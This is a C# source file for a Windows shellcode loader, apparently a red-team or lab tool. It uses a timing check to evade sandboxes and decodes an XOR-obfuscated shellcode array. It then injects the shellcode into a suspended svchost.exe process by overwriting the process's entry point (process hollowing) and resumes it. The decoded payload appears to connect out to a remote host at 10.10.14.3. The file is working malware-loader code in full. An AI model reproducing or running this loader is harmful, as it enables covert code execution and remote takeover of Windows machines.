using System;
using System.Runtime.InteropServices;

namespace Meth
{
    public class Program
    {
        public const uint CREATE_SUSPENDED = 0x4;
        public const int PROCESSBASICINFORMATION = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct ProcessInfo
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct ProcessBasicInfo
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
            ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
            int dwSize, out IntPtr lpNumberOfbytesRW);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);


        public static void Main(string[] args)
        {

            Console.WriteLine($"[*] Incompetent Bastard");
            Console.WriteLine($"[.] If you spend too much time thinking about a thing, you'll never get it done.  ~ Bruce Lee");
            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.8)
            {
                return;
            }

            byte[] sgtgwhq = new byte[739] {
0x53,0xe7,0x2c,0x4b,0x5f,0x47,0x63,0xaf,0xaf,0xaf,0xee,0xfe,0xee,
0xff,0xfd,0xe7,0x9e,0x7d,0xfe,0xca,0xe7,0x24,0xfd,0xcf,0xe7,0x24,
0xfd,0xb7,0xe7,0x24,0xfd,0x8f,0xf9,0xe2,0x9e,0x66,0xe7,0x24,0xdd,
0xff,0xe7,0xa0,0x18,0xe5,0xe5,0xe7,0x9e,0x6f,0x03,0x93,0xce,0xd3,
0xad,0x83,0x8f,0xee,0x6e,0x66,0xa2,0xee,0xae,0x6e,0x4d,0x42,0xfd,
0xee,0xfe,0xe7,0x24,0xfd,0x8f,0x24,0xed,0x93,0xe7,0xae,0x7f,0xc9,
0x2e,0xd7,0xb7,0xa4,0xad,0xa0,0x2a,0xdd,0xaf,0xaf,0xaf,0x24,0x2f,
0x27,0xaf,0xaf,0xaf,0xe7,0x2a,0x6f,0xdb,0xc8,0xe7,0xae,0x7f,0xeb,
0x24,0xef,0x8f,0xff,0x24,0xe7,0xb7,0xe6,0xae,0x7f,0x4c,0xf9,0xe7,
0x50,0x66,0xee,0x24,0x9b,0x27,0xe2,0x9e,0x66,0xe7,0xae,0x79,0xe7,
0x9e,0x6f,0xee,0x6e,0x66,0xa2,0x03,0xee,0xae,0x6e,0x97,0x4f,0xda,
0x5e,0xe3,0xac,0xe3,0x8b,0xa7,0xea,0x96,0x7e,0xda,0x77,0xf7,0xeb,
0x24,0xef,0x8b,0xe6,0xae,0x7f,0xc9,0xee,0x24,0xa3,0xe7,0xeb,0x24,
0xef,0xb3,0xe6,0xae,0x7f,0xee,0x24,0xab,0x27,0xe7,0xae,0x7f,0xee,
0xf7,0xee,0xf7,0xf1,0xf6,0xf5,0xee,0xf7,0xee,0xf6,0xee,0xf5,0xe7,
0x2c,0x43,0x8f,0xee,0xfd,0x50,0x4f,0xf7,0xee,0xf6,0xf5,0xe7,0x24,
0xbd,0x46,0xe4,0x50,0x50,0x50,0xf2,0xe7,0x9e,0x74,0xfc,0xe6,0x11,
0xd8,0xc6,0xc1,0xc6,0xc1,0xca,0xdb,0xaf,0xee,0xf9,0xe7,0x26,0x4e,
0xe6,0x68,0x6d,0xe3,0xd8,0x89,0xa8,0x50,0x7a,0xfc,0xfc,0x47,0xdf,
0xaf,0xaf,0xaf,0xe2,0xc0,0xd5,0xc6,0xc3,0xc3,0xce,0x80,0x9a,0x81,
0x9f,0x8f,0x87,0xf8,0xc6,0xc1,0xcb,0xc0,0xd8,0xdc,0x8f,0xe1,0xfb,
0x8f,0x9e,0x9f,0x81,0x9f,0x94,0x8f,0xf8,0xc6,0xc1,0x99,0x9b,0x94,
0x8f,0xd7,0x99,0x9b,0x86,0x8f,0xee,0xdf,0xdf,0xc3,0xca,0xf8,0xca,
0xcd,0xe4,0xc6,0xdb,0x80,0x9a,0x9c,0x98,0x81,0x9c,0x99,0x8f,0x87,
0xe4,0xe7,0xfb,0xe2,0xe3,0x83,0x8f,0xc3,0xc6,0xc4,0xca,0x8f,0xe8,
0xca,0xcc,0xc4,0xc0,0x86,0x8f,0xec,0xc7,0xdd,0xc0,0xc2,0xca,0x80,
0x9e,0x9c,0x9e,0x81,0x9f,0x81,0x9f,0x81,0x9f,0x8f,0xfc,0xce,0xc9,
0xce,0xdd,0xc6,0x80,0x9a,0x9c,0x98,0x81,0x9c,0x99,0xaf,0xf6,0xfc,
0xf5,0xe2,0x9e,0x6f,0xe2,0x9e,0x66,0xfc,0xfc,0xe6,0x15,0x95,0xf9,
0xd6,0x08,0xaf,0xaf,0xaf,0xaf,0x50,0x7a,0x47,0xa4,0xaf,0xaf,0xaf,
0x9e,0x9f,0x81,0x9e,0x9f,0x81,0x9e,0x9b,0x81,0x9c,0xaf,0xf5,0xe7,
0x26,0x6e,0xe6,0x68,0x6f,0x14,0xae,0xaf,0xaf,0xe2,0x9e,0x66,0xfc,
0xfc,0xc5,0xac,0xfc,0xe6,0x15,0xf8,0x26,0x30,0x69,0xaf,0xaf,0xaf,
0xaf,0x50,0x7a,0x47,0xe6,0xaf,0xaf,0xaf,0x80,0xc8,0xde,0xfe,0xd6,
0xfb,0xdd,0xff,0xc0,0x97,0xfd,0xd8,0xde,0xfc,0xfc,0xdb,0xe3,0xfe,
0xc1,0xc0,0xdf,0xd8,0xd8,0xfc,0xd9,0xca,0xf0,0xdd,0xe8,0x82,0x98,
0xd7,0xd8,0xe5,0x99,0xf9,0xcb,0xfb,0x96,0xc5,0xdf,0xf7,0xe2,0x98,
0xcd,0xfc,0xfe,0x9b,0x9f,0xfd,0x96,0xe2,0xfe,0xf0,0xf0,0xf9,0x9d,
0xec,0x9c,0xe8,0xd5,0x9a,0xc7,0xca,0xf6,0xfe,0xe9,0xd7,0xc2,0xee,
0xe1,0xea,0xaf,0xe7,0x26,0x6e,0xfc,0xf5,0xee,0xf7,0xe2,0x9e,0x66,
0xfc,0xe7,0x17,0xaf,0x9d,0x07,0x2b,0xaf,0xaf,0xaf,0xaf,0xff,0xfc,
0xfc,0xe6,0x68,0x6d,0x44,0xfa,0x81,0x94,0x50,0x7a,0xe7,0x26,0x69,
0xc5,0xa5,0xf0,0xe7,0x26,0x5e,0xc5,0xb0,0xf5,0xfd,0xc7,0x2f,0x9c,
0xaf,0xaf,0xe6,0x26,0x4f,0xc5,0xab,0xee,0xf6,0xe6,0x15,0xda,0xe9,
0x31,0x29,0xaf,0xaf,0xaf,0xaf,0x50,0x7a,0xe2,0x9e,0x6f,0xfc,0xf5,
0xe7,0x26,0x5e,0xe2,0x9e,0x66,0xe2,0x9e,0x66,0xfc,0xfc,0xe6,0x68,
0x6d,0x82,0xa9,0xb7,0xd4,0x50,0x7a,0x2a,0x6f,0xda,0xb0,0xe7,0x68,
0x6e,0x27,0xbc,0xaf,0xaf,0xe6,0x15,0xeb,0x5f,0x9a,0x4f,0xaf,0xaf,
0xaf,0xaf,0x50,0x7a,0xe7,0x50,0x60,0xdb,0xad,0x44,0x05,0x47,0xfa,
0xaf,0xaf,0xaf,0xfc,0xf6,0xc5,0xef,0xf5,0xe6,0x26,0x7e,0x6e,0x4d,
0xbf,0xe6,0x68,0x6f,0xaf,0xbf,0xaf,0xaf,0xe6,0x15,0xf7,0x0b,0xfc,
0x4a,0xaf,0xaf,0xaf,0xaf,0x50,0x7a,0xe7,0x3c,0xfc,0xfc,0xe7,0x26,
0x48,0xe7,0x26,0x5e,0xe7,0x26,0x75,0xe6,0x68,0x6f,0xaf,0x8f,0xaf,
0xaf,0xe6,0x26,0x56,0xe6,0x15,0xbd,0x39,0x26,0x4d,0xaf,0xaf,0xaf,
0xaf,0x50,0x7a,0xe7,0x2c,0x6b,0x8f,0x2a,0x6f,0xdb,0x1d,0xc9,0x24,
0xa8,0xe7,0xae,0x6c,0x2a,0x6f,0xda,0x7d,0xf7,0x6c,0xf7,0xc5,0xaf,
0xf6,0x14,0x4f,0xb2,0x85,0xa5,0xee,0x26,0x75,0x50,0x7a
};

            StartupInfo sInfo = new StartupInfo();
            ProcessInfo pInfo = new ProcessInfo();
            bool cResult = CreateProcess(null, "c:\\\\windows\\\\system32\\\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);

            ProcessBasicInfo pbInfo = new ProcessBasicInfo();
            uint retLen = new uint();
            long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
            IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);

            byte[] procAddr = new byte[0x8];
            byte[] stmyonwsk = new byte[0x200];
            IntPtr bytesRW = new IntPtr();
            bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
            IntPtr ydrevgqwv = (IntPtr)BitConverter.ToInt64(procAddr, 0);
            result = ReadProcessMemory(pInfo.hProcess, ydrevgqwv, stmyonwsk, stmyonwsk.Length, out bytesRW);
            uint yolo = BitConverter.ToUInt32(stmyonwsk, 0x3c);
            uint inimini = yolo + 0x28;
            uint rva = BitConverter.ToUInt32(stmyonwsk, (int)inimini);
            IntPtr qifpj = (IntPtr)((Int64)ydrevgqwv + rva);

            for (int i = 0; i < sgtgwhq.Length; i++)
            {
                sgtgwhq[i] = (byte)((uint)sgtgwhq[i] ^ 0xaf);
            }

            result = WriteProcessMemory(pInfo.hProcess, qifpj, sgtgwhq, sgtgwhq.Length, out bytesRW);

            uint rResult = ResumeThread(pInfo.hThread);
            Console.WriteLine($"[!] Done");
        }
    }
}